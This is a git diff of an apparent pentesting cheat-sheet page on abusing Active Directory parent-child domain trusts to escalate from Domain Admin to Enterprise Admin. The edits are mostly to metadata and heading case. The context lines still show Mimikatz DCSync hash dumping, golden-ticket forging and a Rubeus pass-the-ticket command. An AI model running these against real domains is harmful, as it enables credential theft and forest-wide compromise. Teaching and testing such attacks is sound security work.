@@ -1,7 +1,7 @@
 ---
-title: "Abuse Parent Child Domain Trusts"
-date: 2024-7-2
-tags: ["Kerberos", "Pass-The-Ticket", "Rubeus", "Domain Trust", "Golden Ticket", "Silver Ticket", "Credential Dumping", "Trust Relationship", "Mimikatz", "Pass-The-Hash", "Ticket Granting Ticket", "Domain Controller", "Active Directory", "Windows"]
+title: "Abuse Parent-Child Domain Trusts"
+date: 2025-7-24
+tags: ["Active Directory",  "Privilege Escalation",  "Domain Trusts",  "Parent-Child Trust",  "Kerberos",  "Golden Ticket",  "Mimikatz",  "Rubeus",  "Pass-The-Ticket",  "Ticket Granting Ticket",  "Credential Dumping",  "Cross-Domain Attack",  "Windows"]
 ---
 
 ### Privesc from DA (Domain Admin) to EA (Enterprise Admin)
@@ -9,7 +9,7 @@ tags: ["Kerberos", "Pass-The-Ticket", "Rubeus", "Domain Trust", "Golden Ticket",
 {{< tab set1 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Check trust relationships
+#### 1. Check Trust Relationships
 
 ```console
 # Get all trusted domain objects in a forest
@@ -76,7 +76,7 @@ corp.example.com example.com  ParentChild  Bidirectional
 ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
 ```
 
-#### 2. Get current and target domain SID
+#### 2. Get Current and Target Domain SID
 
 ```console
 .\mimikatz.exe "lsadump::trust" "exit"
@@ -103,7 +103,7 @@ mimikatz(commandline) # exit
 Bye!
 ```
 
-#### 3. Get krbtgt hash
+#### 3. Get krbtgt Hash
 
 ```console
 .\mimikatz.exe "lsadump::dcsync /all /csv" "exit"
@@ -134,7 +134,7 @@ mimikatz(commandline) # exit
 Bye!
 ```
 
-#### 4. Forge a golden ticket
+#### 4. Forge a Golden Ticket
 
 ```console
 # Append '-519' to target domain SID (Enterprise Admins Group)
@@ -176,7 +176,7 @@ Bye!
 
 <small>*Note: Try different high value hashes if failed*</small>
 
-#### 5. Request a service ticket of target domain
+#### 5. Request a Service Ticket of Target Domain
 
 ```console
 .\rubeus.exe asktgs /service:cifs/<TARGET_DOMAIN> /domain:<DOMAIN> /dc:<DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
